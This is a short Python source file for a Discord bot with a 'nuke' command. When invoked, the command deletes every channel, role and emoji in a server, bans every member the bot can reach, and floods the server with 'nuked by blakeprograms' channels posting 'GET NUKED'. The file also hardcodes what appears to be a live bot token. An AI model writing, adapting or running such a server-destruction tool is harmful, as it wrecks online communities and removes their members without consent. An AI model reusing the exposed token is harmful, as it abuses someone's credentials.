from discord.ext import commands
import discord

client = commands.Bot(command_prefix = 't.')

@client.command(pass_context=True)
async def nuke(ctx):

    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("nuked by blakeprograms")
        await channel.send("GET NUKED")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Action completed: Nuclear Destruction")

client.run('OTg2NzMwMzk3OTY4Nzg1NTE4.GbAMrq.vlb3wjzuzbTJWLztfO6x8LaBfiKn5wHbQ3DEF8')